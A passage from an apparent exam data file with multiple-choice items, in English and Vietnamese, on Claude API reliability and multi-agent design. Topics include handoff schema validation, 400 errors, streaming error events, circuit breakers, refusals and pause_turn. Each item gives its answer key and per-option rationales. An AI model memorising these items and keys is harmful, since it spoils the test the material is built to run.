      "Bài khuyên tìm giải pháp đơn giản nhất, chỉ thêm độ phức tạp khi cần. Agent chỉ đáng giá khi việc thật sự cần model tự quyết từng bước."
    ],
    opts: [
      { k: "A", gist: "A new model version shipped last week and the team wants to try it out.",
        why: [
          "Sai vì model mới ra là một sự kiện, không phải bằng chứng về kiến trúc.",
          "Model nào cũng chạy được trong workflow lẫn agent, nên điều này không nghiêng về bên nào."
        ] },
      { k: "B", gist: "Developers think the agent is more interesting to maintain than a scripted flow.",
        why: [
          "Sai vì ý thích của developer không phải chỉ số production.",
          "Nó còn kéo về phía giữ agent, ngược với điều đề hỏi."
        ] },
      { k: "C", gist: "Traces show that 95% of runs go through the same tool-call sequence with the same branching decisions.",
        why: [
          "Đúng: 95% lượt đi cùng một đường, cùng nhánh rẽ, tức là việc này đã định rõ (ý 2).",
          "Model không đưa ra quyết định nào mà code không viết sẵn được. Workflow chạy đúng đường đó, dự đoán được hơn (ý 1)."
        ] },
      { k: "D", gist: "For these typical runs the agent matches a scripted baseline on accuracy but costs several times more per success.",
        why: [
          "Đúng: cùng độ chính xác mà đắt gấp nhiều lần, tức là cái giá của agent không mua được hiệu quả tốt hơn (ý 2).",
          "Ghép với C: đường ít biến đổi, linh hoạt không đem lại gì, thì chọn cách đơn giản hơn (ý 3)."
        ] },
      { k: "E", gist: "The agent has access to thirty tools spread across several teams' systems.",
        why: [
          "Sai vì số tool một mình không nói đường đi có biến đổi hay không.",
          "Dễ bị cuốn vì nhiều tool nghe như hệ phức tạp, cần siết lại. Nhưng ba mươi tool vẫn có thể được dùng theo một đường cố định, hoặc theo cả trăm đường. Phải nhìn trace như C mới biết."
        ] }
    ],
    refs: [
      { label: "Bài engineering Building effective agents, mục “What are agents?” và “When (and when not) to use agents”: workflow khác agent ra sao, agent đổi độ trễ và chi phí lấy hiệu quả", href: "https://www.anthropic.com/engineering/building-effective-agents" }
    ]
  },
  {
    de: 1, n: 17, total: 100, sub: "1.1", subName: "Điều phối multi-agent",
    answer: "C",
    ask: "In a multi-agent pipeline, the worker that extracts invoice totals was changed to return a field named “amount_due” rather than “total”. The supervisor still reads “total”, quietly falls back to zero when it is missing, and downstream payments go out wrong for a day before anyone catches it. What is the most direct fix?",
    scene: [
      "Pipeline nhiều agent: worker trích tổng tiền hóa đơn, supervisor đọc kết quả.",
      "Worker được sửa, đổi tên trường từ <code>total</code> sang <code>amount_due</code>. Supervisor vẫn đọc <code>total</code>, thấy thiếu thì lặng lẽ điền 0.",
      "Hậu quả: thanh toán phía sau sai cả ngày mới có người phát hiện. Lỗi nằm ở chỗ bàn giao giữa hai agent, và không ai được báo."
    ],
    asks: [
      "Cách sửa trực tiếp nhất là gì?",
      "Tức là: lần sau hợp đồng giữa hai agent bị phá thì phải lộ ra ngay, không âm thầm chạy tiếp."
    ],
    facts: [
      "Silent failure (lỗi im lặng): thiếu dữ liệu mà code tự điền mặc định thì hệ vẫn chạy, không báo gì, dữ liệu sai chảy xuống dưới.",
      "Schema validation tại điểm bàn giao (handoff): kiểm đầu ra worker theo schema đã khai, thiếu trường bắt buộc hay có trường lạ thì báo lỗi ngay (fail loudly). Contract test (kiểm thử hợp đồng): test kiểm hai bên vẫn đúng định dạng đã thống nhất, chạy trước khi deploy.",
      "Docs structured outputs liệt kê lỗi hay gặp khi đầu ra không bị ràng buộc theo schema: JSON hỏng, thiếu trường bắt buộc, sai kiểu. Bài multi-agent research của Anthropic: agent có trạng thái và lỗi cộng dồn, thay đổi nhỏ lan thành thay đổi lớn.",
      "Lỗi do code đổi tên trường là lỗi tất định: gọi lại bao nhiêu lần, model to cỡ nào, worker vẫn trả <code>amount_due</code>."
    ],
    opts: [
      { k: "A", gist: "Move the worker to a larger model so it sticks to the old field name more reliably.",
        why: [
          "Sai gốc: tên trường đổi do code của worker, không phải do model quên (ý 4).",
          "Model to hơn vẫn trả đúng định dạng mới mà code yêu cầu."
        ] },
      { k: "B", gist: "Make the supervisor retry every worker three times and use the majority result.",
        why: [
          "Sai vì ba lần đều trả <code>amount_due</code>, đa số vẫn là thiếu <code>total</code> (ý 4).",
          "Tốn gấp ba mà supervisor vẫn điền 0."
        ] },
      { k: "C", gist: "Validate worker output against a declared schema at the handoff, fail loudly on missing or unexpected fields, and add a contract test for the interface.",
        why: [
          "Đúng chỗ hỏng: kiểm schema tại điểm bàn giao biến lỗi im lặng thành lỗi lộ ngay (ý 1, ý 2).",
          "Thiếu <code>total</code> và có trường lạ <code>amount_due</code> thì dừng và báo, không điền 0 rồi trả tiền sai. Contract test bắt được việc đổi tên trước khi lên production."
        ] },
      { k: "D", gist: "Add a line to the supervisor's prompt asking it to re-check any total that looks unusually low.",
        why: [
          "Sai vì số 0 do code của supervisor tự điền, prompt không phân biệt được “thiếu trường” với “đúng là bằng 0”.",
          "Dễ bị cuốn vì nghe như thêm một lớp kiểm. Nhưng lời dặn trong prompt không bảo đảm gì, và lỗi vẫn im lặng. Phải chặn bằng code ở điểm bàn giao (ý 2)."
        ] }
    ],
    refs: [
      { label: "Docs Structured outputs, mục “Why use structured outputs”: không ràng buộc schema thì gặp JSON hỏng, thiếu trường bắt buộc, sai kiểu", href: "https://platform.claude.com/docs/en/build-with-claude/structured-outputs#why-use-structured-outputs" },
      { label: "Bài engineering How we built our multi-agent research system, mục “Production reliability and engineering challenges”: lỗi cộng dồn, thay đổi nhỏ lan rộng", href: "https://www.anthropic.com/engineering/multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 18, total: 100, sub: "2.1", subName: "Độ tin cậy khi gọi Claude",
    answer: "A",
    ask: "A chat service on the Messages API retries every failed call five times with exponential backoff, then fails over to a secondary region. After a refactor, some tool-using conversations fail on every attempt. Logs show HTTP 400 invalid_request_error saying thinking blocks in the latest assistant message cannot be modified. The refactor added a step that filters assistant content blocks by type before sending them back. What is the right response?",
    scene: [
      "Dịch vụ chat trên Messages API: lỗi thì retry 5 lần với exponential backoff (chờ tăng dần), rồi chuyển sang region phụ.",
      "Sau một lần refactor, một số hội thoại có dùng tool lỗi ở mọi lần thử. Log: HTTP 400 <code>invalid_request_error</code>, báo thinking block trong lượt assistant gần nhất không được sửa.",
      "Refactor đã thêm một bước lọc content block của assistant theo type trước khi gửi lại.",
      "Chỗ khó: ba phương án sai đều xoay quanh retry, failover, hàng đợi. Phải nhận ra 400 là request hỏng, không phải dịch vụ hỏng."
    ],
    asks: [
      "Phản ứng đúng là gì?",
      "Tức là: sửa chỗ dựng request cho đúng, và đừng tốn công retry thứ không bao giờ thành."
    ],
    facts: [
      "400 <code>invalid_request_error</code>: request sai định dạng hoặc nội dung. Gửi lại y nguyên thì vẫn 400. SDK chính thức chỉ tự retry lỗi tạm thời: lỗi kết nối, 429, 5xx.",
      "Docs errors, mục “Thinking blocks cannot be modified”: khi dùng tool, phải gửi lại mọi block <code>thinking</code> và <code>redacted_thinking</code> của lượt assistant đúng như nhận, kể cả block có trường thinking rỗng. App lọc block theo type trước khi gửi thì phải giữ cả hai type đó.",
      "429 <code>rate_limit_error</code> mới là chạm rate limit. 400 và 429 là hai loại lỗi khác hẳn.",
      "Circuit breaker (cầu dao): ngắt lời gọi tới một phụ thuộc đang hỏng để khỏi dồn tải vào nó. Nó dành cho sự cố phía dịch vụ, không sửa được request sai."
    ],
    opts: [
      { k: "A", gist: "Fix how the request is built so every thinking and redacted_thinking block is passed back exactly as received, and stop retrying or failing over on 400 responses.",
        why: [
          "Đúng gốc: bước lọc theo type đã bỏ hoặc sửa thinking block, đúng ca docs mô tả (ý 2).",
          "Và đúng cách xử lý lỗi: 400 là lỗi của request, retry hay đổi region chỉ lặp lại lỗi và tốn thêm (ý 1)."
        ] },
      { k: "B", gist: "Treat it as a rate limit and hold the requests in a queue until traffic drops.",
        why: [
          "Sai loại lỗi: đây là 400, không phải 429 (ý 3).",
          "Đợi bao lâu thì request vẫn thiếu thinking block, chỉ làm lỗi đến muộn hơn."
        ] },
      { k: "C", gist: "Lengthen the backoff and raise the retry count, since the secondary region might accept the request.",
        why: [
          "Sai vì request không hợp lệ thì gửi đâu cũng không hợp lệ. Region phụ chạy cùng API, cùng luật (ý 1).",
          "Thêm lượt retry là thêm chi phí, thêm độ trễ cho user, rồi vẫn lỗi."
        ] },
      { k: "D", gist: "Add a circuit breaker that trips after the first 400 and sends all traffic to the secondary region, keeping monitoring as is.",
        why: [
          "Sai công cụ: circuit breaker dành cho phụ thuộc đang hỏng, còn đây là request hỏng (ý 4).",
          "Chuyển hết sang region phụ thì region phụ cũng trả 400. Các hội thoại đang chạy tốt cũng bị đẩy đi vô cớ.",
          "Dễ bị cuốn vì circuit breaker là mẫu độ tin cậy chuẩn, nghe rất “production”. Nhưng nó giải bài khác."
        ] }
    ],
    refs: [
      { label: "Docs Claude API errors, mục “Thinking blocks cannot be modified”: gửi lại thinking và redacted_thinking đúng như nhận, kể cả khi app lọc block theo type", href: "https://platform.claude.com/docs/en/api/errors#thinking-blocks-cannot-be-modified" },
      { label: "Docs Claude API errors, mục “HTTP errors”: 400 là lỗi request, SDK chỉ tự retry lỗi kết nối, 429, 5xx", href: "https://platform.claude.com/docs/en/api/errors#http-errors" }
    ]
  },
  {
    de: 1, n: 19, total: 100, sub: "2.1", subName: "Độ tin cậy khi gọi Claude",
    answer: "B",
    ask: "A streaming assistant displays partial answers to users as tokens come in. Monitoring shows roughly 0.3% of responses stop suddenly mid-sentence with no error shown. Those calls returned HTTP 200, and the client only checks the HTTP status and the final stop reason when the stream closes normally. Which change fixes this best?",
    scene: [
      "Trợ lý streaming: token về tới đâu hiện cho user tới đó.",
      "Khoảng 0,3% câu trả lời dừng đột ngột giữa câu, không báo lỗi gì. HTTP status của các lượt đó là 200.",
      "Client chỉ xem HTTP status, và chỉ xem stop reason cuối khi luồng đóng bình thường. Luồng kết thúc bất thường thì không ai xem."
    ],
    asks: [
      "Thay đổi nào sửa chuyện này tốt nhất?",
      "Tức là: lỗi đang xảy ra ở đâu mà client không thấy, và phải bắt nó thế nào."
    ],
    facts: [
      "Docs errors: nhận streaming qua SSE thì lỗi có thể xảy ra sau khi API đã trả 200. Lúc đó xử lý lỗi không theo cơ chế mã HTTP thông thường.",
      "Docs streaming, mục “Error events”: API có thể gửi event lỗi ngay trong luồng, vd <code>overloaded_error</code>, cái mà khi không streaming sẽ là HTTP 529.",
      "Docs streaming, mục “Error recovery”: luồng bị ngắt thì giữ phần đã nhận rồi gửi request tiếp nối. Block <code>tool_use</code> và <code>thinking</code> không khôi phục dở được.",
      "Docs errors, mục “Long requests”: request dài nên dùng streaming hoặc Message Batches. Không streaming mà <code>max_tokens</code> lớn thì mạng có thể cắt kết nối nhàn rỗi, request lỗi hoặc timeout."
    ],
    opts: [
      { k: "A", gist: "Raise the client timeout a lot so the stream always runs to completion.",
        why: [
          "Sai vì luồng không bị cắt do timeout phía client, mà kết thúc bằng một event lỗi (ý 2).",
          "Chờ lâu hơn không làm event lỗi biến mất. Client vẫn bỏ qua nó."
        ] },
      { k: "B", gist: "Handle error events that arrive inside the stream, discard or flag the partial output, and retry with bounded backoff.",
        why: [
          "Đúng chỗ hỏng: lỗi đến sau 200, dưới dạng event trong luồng, nên client phải nghe event đó (ý 1, ý 2).",
          "Bắt được rồi thì đánh dấu phần dở cho user biết, rồi gọi lại có giới hạn. Lỗi kiểu <code>overloaded_error</code> là tạm thời, retry có ích. Docs còn chỉ cách nối tiếp từ phần đã nhận (ý 3)."
        ] },
      { k: "C", gist: "Turn off streaming and make every request non-streaming so the status code is always accurate.",
        why: [
          "Đổi vấn đề này lấy vấn đề khác: request dài không streaming dễ bị mạng cắt hoặc timeout (ý 4).",
          "Mất luôn lợi ích hiện chữ dần cho user. Và lỗ hổng xử lý lỗi trong client vẫn còn nguyên.",
          "Dễ bị cuốn vì “status code luôn đúng” nghe gọn. Nhưng đề hỏi cách sửa, không phải cách né tính năng."
        ] },
      { k: "D", gist: "Raise max_tokens so answers can't be cut off mid-sentence.",
        why: [
          "Sai chẩn đoán: chạm <code>max_tokens</code> thì luồng đóng bình thường với stop reason <code>max_tokens</code>, client đã thấy được.",
          "Các ca này kết thúc bằng lỗi, không phải hết độ dài (ý 2)."
        ] }
    ],
    refs: [
      { label: "Docs Streaming messages, mục “Error events”: lỗi như <code>overloaded_error</code> đến dưới dạng event trong luồng", href: "https://platform.claude.com/docs/en/build-with-claude/streaming#error-events" },
      { label: "Docs Streaming messages, mục “Error recovery”: giữ phần đã nhận và gửi request tiếp nối khi luồng bị ngắt", href: "https://platform.claude.com/docs/en/build-with-claude/streaming#error-recovery" },
      { label: "Docs Claude API errors, mục “HTTP errors” (đoạn cuối) và “Long requests”: lỗi có thể đến sau 200 khi streaming, request dài nên streaming", href: "https://platform.claude.com/docs/en/api/errors#http-errors" }
    ]
  },
  {
    de: 1, n: 20, total: 100, sub: "2.1", subName: "Độ tin cậy khi gọi Claude",
    answer: "C",
    ask: "An agent loop that reads large documents starts getting responses with stop_reason model_context_window_exceeded. The team's fallback logic resends failed calls to a second model, which hits the same stop, so cost doubles. What should the loop do when it sees this stop reason?",
    scene: [
      "Vòng lặp agent đọc tài liệu lớn, bắt đầu nhận phản hồi có <code>stop_reason: \"model_context_window_exceeded\"</code>.",
      "Logic dự phòng coi đó là lỗi, gửi lại sang model thứ hai. Model thứ hai dừng y vậy, chi phí gấp đôi.",
      "Chỗ khó: phải hiểu stop reason này nói gì. Nó không phải lỗi tạm thời, không phải từ chối, cũng không phải chạm <code>max_tokens</code>."
    ],
    asks: [
      "Gặp stop reason này, vòng lặp nên làm gì?",
      "Tức là: context đã đầy thì phải làm nó vơi đi, chứ không phải đổi chỗ gửi."
    ],
    facts: [
      "Docs “Handling stop reasons”: <code>model_context_window_exceeded</code> nghĩa là phản hồi đã lấp đầy context window của model. Cách xử lý docs ghi: coi như phản hồi bị cắt (truncated).",
      "<code>max_tokens</code> là stop reason khác: chạm giới hạn đầu ra mày đặt, xử lý bằng tăng <code>max_tokens</code> hoặc viết tiếp. <code>refusal</code> cũng là stop reason riêng, khi Claude từ chối trả lời.",
      "Docs context editing: chiến lược <code>clear_tool_uses_20250919</code> xóa các kết quả tool cũ nhất khi context vượt ngưỡng, thay bằng dòng giữ chỗ. Compaction tóm tắt lịch sử để việc dài chạy tiếp được dù lẽ ra vượt context window.",
      "Cùng một input thì lần nào cũng đầy như nhau. Đây là điều kiện tất định, không phải trục trặc tạm thời."
    ],
    opts: [
      { k: "A", gist: "Increase max_tokens so the response can finish inside the window.",
        why: [
          "Sai vì giới hạn chạm phải là context window, không phải <code>max_tokens</code> (ý 1, ý 2).",
          "Cửa sổ đã đầy thì nới hạn mức đầu ra cũng không tạo thêm chỗ."
        ] },
      { k: "B", gist: "Back off and resend the exact same request, treating it as a temporary capacity problem.",
        why: [
          "Sai vì cùng input thì cửa sổ vẫn đầy y như cũ (ý 4).",
          "Dễ bị cuốn vì nghe giống lỗi quá tải, vốn retry là đúng. Nhưng đây không phải lỗi, mà là phản hồi bình thường có stop reason nói rõ context đã đầy."
        ] },
      { k: "C", gist: "Treat the output as truncated, shrink the context (for example by clearing stale tool results or compacting), then continue rather than retrying somewhere else.",
        why: [
          "Đúng cách docs ghi: coi phản hồi là bị cắt (ý 1).",
          "Rồi xử lý gốc: dọn kết quả tool cũ hoặc nén lịch sử để có chỗ, rồi chạy tiếp (ý 3). Không gửi sang model khác, nên hết cảnh trả tiền gấp đôi."
        ] },
      { k: "D", gist: "Send the request down the safety-handling path, since the model refused to go on.",
        why: [
          "Sai vì đây không phải từ chối. Từ chối có stop reason riêng là <code>refusal</code> (ý 2).",
          "Đưa vào luồng an toàn là xử lý nhầm ca, context vẫn đầy."
        ] }
    ],
    refs: [
      { label: "Docs Handling stop reasons, mục “model_context_window_exceeded”: phản hồi lấp đầy context window, xử lý như bị cắt", href: "https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons#model-context-window-exceeded" },
      { label: "Docs Context editing, mục “Tool result clearing”: xóa kết quả tool cũ khi context vượt ngưỡng", href: "https://platform.claude.com/docs/en/build-with-claude/context-editing#tool-result-clearing" }
    ]
  },
  {
    de: 1, n: 21, total: 100, sub: "2.1", subName: "Độ tin cậy khi gọi Claude",
    answer: "A",
    ask: "The primary model keeps returning overload errors (529) for several minutes at a time. Every user request is retried three times with waits of up to 30 seconds, so request threads accumulate, the web tier's worker pool runs out, and endpoints that have nothing to do with Claude begin to time out. Which design change most directly limits the blast radius?",
    scene: [
      "Model chính trả lỗi quá tải (529), kéo dài vài phút.",
      "Mỗi request thử lại 3 lần, mỗi lần chờ tới 30 giây, tức là có thể giữ thread cả phút rưỡi. Thread chồng lên nhau, cạn worker pool (nhóm luồng xử lý request) của tầng web, và cả endpoint không dính gì tới Claude cũng timeout.",
      "Chỗ khó: lỗi gốc nằm ở API, mày không sửa được. Cái cần chặn là lỗi lan từ một tính năng ra cả hệ thống."
    ],
    asks: [
      "Thay đổi thiết kế nào thu hẹp “blast radius” (vùng ảnh hưởng của sự cố) trực tiếp nhất?",
      "Tức là: khi Claude quá tải lâu, request tới Claude phải nhả thread thật nhanh, để phần còn lại của web vẫn chạy.",
      "Soi từng phương án: nó làm thread được nhả sớm hơn, hay giữ thread lâu hơn?"
    ],
    facts: [
      "Docs Errors: 529 <code>overloaded_error</code> là API tạm thời quá tải, có thể xảy ra khi lưu lượng cao trên toàn bộ người dùng. Không phải lỗi riêng của request mày, gửi lại ngay cũng khó qua.",
      "Circuit breaker (cầu dao): đếm lỗi liên tiếp tới một dịch vụ, vượt ngưỡng thì “mở”, mọi lời gọi sau trả lỗi ngay không chờ. Một lúc sau mới cho vài lời gọi thử xem dịch vụ hồi chưa.",
      "Fail fast (thất bại nhanh) kèm degraded path (đường xuống cấp): trả ngay một câu trả lời kém hơn nhưng dùng được, như từ model nhỏ hơn, bản đã cache, hay câu soạn sẵn.",
      "Thread pool có hạn. Mỗi request giữ thread càng lâu thì pool càng nhanh cạn. Retry kèm chờ dài trong một sự cố kéo dài vài phút chỉ kéo dài thời gian giữ thread."
    ],
    opts: [
      { k: "A", gist: "Put a circuit breaker with short per-call timeouts in front of the model, and while it is open, fail fast to a degraded path such as a smaller model or a cached or canned response.",
        why: [
          "Đúng: cầu dao mở thì lời gọi tới model chính trả về ngay, không nằm chờ, thread được nhả (ý 2, ý 4).",
          "Người dùng vẫn nhận câu trả lời từ đường xuống cấp (ý 3). Sự cố bị nhốt trong tính năng Claude, các endpoint khác không bị kéo theo.",
          "Timeout ngắn cho từng lời gọi chặn thêm một lớp: kể cả lúc cầu dao chưa mở, không lời gọi nào giữ thread quá lâu."
        ] },
      { k: "B", gist: "Raise the backoff cap so clients spread their retries across a longer window.",
        why: [
          "Sai hướng: dãn retry ra thì mỗi request giữ thread còn lâu hơn, pool cạn nhanh hơn (ý 4).",
          "Dễ bị cuốn vì exponential backoff (chờ tăng dần) là cách chuẩn với lỗi tạm thời. Nhưng ở đây thread đang chờ đồng bộ ngay trong request của người dùng, chờ càng dài càng hại."
        ] },
      { k: "C", gist: "Retry right away with no wait, so requests complete sooner once the model comes back.",
        why: [
          "Sai: API đang quá tải mà dội lời gọi liên tục thì chỉ thêm tải (ý 1).",
          "Sự cố kéo dài vài phút, retry ngay không làm model hồi sớm hơn. Thread vẫn bận, chỉ là bận vì gửi thay vì bận vì chờ."
        ] },
      { k: "D", gist: "Enlarge the worker pool so more threads can sit waiting on retries.",
        why: [
          "Sai: pool to hơn chỉ dời lúc cạn, không đổi việc mỗi request giữ thread rất lâu (ý 4).",
          "Sự cố đủ dài thì pool mới cũng cạn, mà tốn thêm bộ nhớ và tài nguyên chỉ để chờ."
        ] }
    ],
    refs: [
      { label: "Docs Errors, mục “HTTP errors”: 529 là API quá tải chung, và SDK tự retry có backoff, mặc định hai lần", href: "https://platform.claude.com/docs/en/api/errors#http-errors" }
    ]
  },
  {
    de: 1, n: 22, total: 100, sub: "2.1", subName: "Độ tin cậy khi gọi Claude",
    answer: "B",
    ask: "As protection against an outage of the first-party API, a team sends failed requests to the same Claude model hosted on a cloud provider's platform. During the first failover drill, the fallback calls return 400 errors. The app relies on a beta feature that is turned on for the primary platform but is not offered on the fallback platform. What should the team do?",
    scene: [
      "Đường chính gọi Claude API trực tiếp. Đường dự phòng (fallback) gọi cùng model đó trên nền tảng của một nhà cung cấp cloud.",
      "Diễn tập lần đầu: lời gọi dự phòng trả 400. Đề nói sẵn nguyên nhân: app dùng một tính năng beta có ở nền tảng chính nhưng không có ở nền tảng dự phòng.",
      "Chỗ khó: cùng model không có nghĩa là cùng tính năng. Cái cần quyết là xử lý chỗ lệch đó sao cho đường dự phòng chạy được thật."
    ],
    asks: [
      "Team nên làm gì?",
      "Tức là: giữ đường dự phòng, dựng request dự phòng chỉ dùng thứ nền tảng đó có, và chứng minh nó chạy trước khi cần tới."
    ],
    facts: [
      "Docs Features overview: mỗi trang tính năng ghi rõ dùng được ở đâu. Tính năng của Claude API không tự động có trên mọi nền tảng cloud.",
      "Ví dụ: trang Claude on Amazon Bedrock (<code>bedrock-runtime</code>) có mục “Features not supported” (không hỗ trợ), liệt kê server tool như web search, code execution, cùng Message Batches, Files API, MCP connector… Cách bật beta cũng khác: với InvokeModel, beta nằm trong mảng <code>anthropic_beta</code> trong body.",
      "400 <code>invalid_request_error</code> là lỗi do chính request. Gửi lại y nguyên thì vẫn 400, khác với 429 hay 529.",
      "Đường dự phòng không được chạy thử thường xuyên thì không đáng tin. Biết nó hỏng ngay giữa sự cố thật là quá muộn."
    ],
    opts: [
      { k: "A", gist: "Resend the same request to the fallback platform a few more times in case the feature shows up.",
        why: [
          "Sai: 400 là lỗi do request. Tính năng không có thì gửi bao nhiêu lần cũng 400 (ý 3).",
          "Tốn thêm thời gian đúng lúc đường chính đang sập, người dùng chờ lâu hơn mà không được gì."
        ] },
      { k: "B", gist: "Keep a capability matrix per platform, generate the fallback request from it with a reduced feature set, and exercise the fallback path in CI and in regular drills.",
        why: [
          "Đúng: capability matrix (bảng năng lực theo nền tảng) ghi tính năng nào có ở đâu, request dự phòng chỉ dùng thứ có (ý 1, ý 2).",
          "“Degraded feature set” (bộ tính năng rút gọn): thiếu tính năng beta thì câu trả lời kém đi chút, nhưng vẫn trả lời được.",
          "Chạy đường dự phòng trong CI và diễn tập định kỳ: lần sau lệch tính năng thì lộ ra ở đó, không phải giữa sự cố thật (ý 4)."
        ] },
      { k: "C", gist: "Strip the beta feature from the primary path too, and stop adopting new features altogether.",
        why: [
          "Sai vì sửa quá tay: bỏ giá trị trên đường chính chỉ để hai đường giống nhau.",
          "Cấm luôn tính năng mới là chặn cả lộ trình sản phẩm. Chỗ lệch xử lý được ngay ở request dự phòng (ý 2), không cần hạ đường chính."
        ] },
      { k: "D", gist: "Turn off the fallback, because routing across platforms can never be made reliable.",
        why: [
          "Sai: bỏ luôn khả năng chống sự cố, trong khi lỗi chỉ là chưa xử lý chỗ lệch tính năng.",
          "Dễ bị cuốn vì diễn tập vừa hỏng, nghe như “không đáng tin”. Nhưng diễn tập sinh ra chính để tìm lỗi kiểu này rồi sửa, không phải để bỏ cuộc."
        ] }
    ],
    refs: [
      { label: "Docs Features overview, mục “Platform features”: mỗi tính năng ghi rõ dùng được ở nền tảng nào", href: "https://platform.claude.com/docs/en/build-with-claude/overview#platform-features" },
      { label: "Docs Claude on Amazon Bedrock, mục “Feature support”: danh sách tính năng không có trên Bedrock", href: "https://platform.claude.com/docs/en/build-with-claude/claude-on-amazon-bedrock#feature-support" }
    ]
  },
  {
    de: 1, n: 23, total: 100, sub: "2.1", subName: "Độ tin cậy khi gọi Claude",
    answer: "DE",
    ask: "A service occasionally gets responses whose stop_reason is refusal, delivered with HTTP 200. The code currently counts them as successes and displays the empty text to users. Which two changes best handle this class of failure? (Choose two.)",
    scene: [
      "Thỉnh thoảng response về với <code>stop_reason: \"refusal\"</code> (từ chối), HTTP vẫn là 200.",
      "Code hiện tại coi đó là thành công, đưa luôn phần text rỗng cho người dùng.",
      "Chỗ khó: không có mã lỗi HTTP nào. Mọi cơ chế dựa vào mã lỗi (retry, đếm lỗi, cảnh báo) đều không thấy nó."
    ],
    asks: [
      "Hai thay đổi nào xử lý loại lỗi này tốt nhất?",
      "Tức là: nhận ra refusal là một kết quả riêng, xử lý nó có chủ đích, và theo dõi được nó.",
      "Soi từng phương án: nó hiểu đúng refusal là gì, hay coi nó như lỗi tạm thời, lỗi hạ tầng?"
    ],
    facts: [
      "Docs Refusals and fallback: classifier an toàn từ chối thì mày nhận response bình thường, không phải lỗi, với <code>stop_reason: \"refusal\"</code>. Đối tượng <code>stop_details</code> có <code>category</code> (mảng chính sách bị chạm) và <code>explanation</code> (lời giải thích để hiển thị, không để parse).",
      "Docs dặn rẽ nhánh theo <code>stop_reason</code> bằng <code>\"refusal\"</code>, không dựa vào <code>content</code>. <code>category</code> có thể là <code>null</code>.",
      "Gửi lại request đã bị từ chối cho cùng model thường lại bị từ chối. Muốn thử lại thì docs chỉ sang một model dự phòng (fallback).",
      "Docs mục “Common pitfalls”: refusal là HTTP 200, nên giám sát dựa trên tỉ lệ lỗi hay 5xx không bao giờ thấy nó. Phải phát sự kiện riêng cho mỗi refusal."
    ],
    opts: [
      { k: "A", gist: "Retry the exact same request up to five times with exponential backoff, assuming refusals are transient.",
        why: [
          "Sai ở giả định: refusal không phải lỗi tạm thời. Gửi lại y nguyên cho cùng model thường lại bị từ chối (ý 3).",
          "Năm lần retry là năm lần tốn tiền, người dùng chờ thêm, kết quả vẫn vậy."
        ] },
      { k: "B", gist: "Treat the response as an HTTP 500 and charge it to the infrastructure error budget.",
        why: [
          "Sai: hạ tầng không hỏng gì, response hợp lệ (ý 1). Gắn nhãn 500 là làm bẩn số liệu độ tin cậy.",
          "Dễ bị cuốn vì nghe như “ít ra cũng đếm được”. Nhưng nó giấu nguyên nhân thật (prompt, chính sách, nội dung người dùng) dưới một lỗi hạ tầng không có thật, người trực sự cố sẽ tìm sai chỗ."
        ] },
      { k: "C", gist: "Rephrase the user's message automatically and resend until the model goes along with it.",
        why: [
          "Sai: cố lách một quyết định an toàn bằng cách đổi lời là không phù hợp, và kết quả khó đoán.",
          "Thử tới khi “lọt” là đúng thứ classifier được dựng ra để chặn. Đường thử lại docs chỉ là sang model dự phòng (ý 3), không phải viết lại câu của người dùng."
        ] },
      { k: "D", gist: "Branch on stop_reason refusal as an outcome of its own and route it to a defined safety path that shows a suitable message or escalates, instead of the normal retry path.",
        why: [
          "Đúng: rẽ nhánh theo <code>stop_reason</code>, đúng cách docs dặn (ý 1, ý 2).",
          "Nhánh an toàn có chủ đích: hiện thông báo phù hợp (có thể dùng <code>explanation</code>), chuyển người xử lý, hoặc thử model dự phòng nếu chính sách cho phép. Không rơi vào vòng retry chung (ý 3)."
        ] },
      { k: "E", gist: "Log each refusal with its reported category to telemetry, and alert on the refusal rate broken down by prompt and model version.",
        why: [
          "Đúng: refusal không hiện trong số liệu lỗi, nên phải có sự kiện riêng (ý 4).",
          "Ghi kèm <code>category</code> và chia theo phiên bản prompt, model: đổi prompt hay đổi model mà tỉ lệ từ chối vọt lên là thấy ngay, biết luôn thủ phạm (ý 1)."
        ] }
    ],
    refs: [
      { label: "Docs Refusals and fallback, mục “What a refusal looks like”: refusal là HTTP 200, stop_details có category và explanation", href: "https://platform.claude.com/docs/en/build-with-claude/refusals-and-fallback#refusal-response" },
      { label: "Docs Refusals and fallback, mục “Common pitfalls”: thử lại trên model khác, đo refusal như tín hiệu riêng, rẽ nhánh theo stop_reason", href: "https://platform.claude.com/docs/en/build-with-claude/refusals-and-fallback#common-pitfalls" }
    ]
  },
  {
    de: 1, n: 24, total: 100, sub: "2.1", subName: "Độ tin cậy khi gọi Claude",
    answer: "D",
    ask: "An agent relies on server-side tools like web search. Now and then a response comes back with stop_reason pause_turn, and the app treats that as the turn being over, so users see an answer that is only half done. How should pause_turn be handled?",
    scene: [
      "Agent dùng server tool (tool chạy phía Anthropic) như web search.",
      "Thỉnh thoảng response về với <code>stop_reason: \"pause_turn\"</code>. App coi là xong lượt, người dùng thấy câu trả lời dở dang.",
      "Chỗ khó: bốn phương án là bốn cách hiểu khác nhau về <code>pause_turn</code>: hết token, lỗi, cần nhắc “tiếp đi”, hay chỉ là tạm dừng."
    ],
    asks: [
      "Xử lý <code>pause_turn</code> thế nào cho đúng?",
      "Tức là: biết <code>pause_turn</code> nghĩa là gì, rồi tiếp tục lượt đó đúng cách docs quy định, không mất phần đã làm."
    ],
    facts: [
      "Docs Stop reasons: <code>pause_turn</code> trả về khi vòng lấy mẫu phía server chạm giới hạn số vòng lặp trong lúc chạy server tool như web search. Mặc định 10 vòng mỗi request. Không phải lỗi, cũng không phải hết token.",
      "Cách tiếp tục: giữ các message cũ, thêm <code>content</code> của response y nguyên làm message <code>assistant</code>, gửi lại với cùng <code>tools</code>, và không thêm message user nào sau message <code>assistant</code> đó.",
      "Code mẫu của docs bọc việc này trong vòng lặp có giới hạn (<code>max_requests=5</code>): quá số lần thì trả response cuối, không lặp mãi.",
      "<code>max_tokens</code> là một stop reason khác: dừng vì chạm giới hạn <code>max_tokens</code> đặt trong request."
    ],
    opts: [
      { k: "A", gist: "Raise max_tokens, since pause_turn means the response ran into the output limit.",
        why: [
          "Sai ở giả định: chạm giới hạn output thì stop reason là <code>max_tokens</code>, không phải <code>pause_turn</code> (ý 4).",
          "Tăng <code>max_tokens</code> không đụng gì tới giới hạn vòng lặp phía server (ý 1), lượt vẫn bị tạm dừng như cũ."
        ] },
      { k: "B", gist: "Handle pause_turn as an error: back off exponentially, then resend the original request from scratch.",
        why: [
          "Sai: <code>pause_turn</code> là response thành công, không phải lỗi (ý 1).",
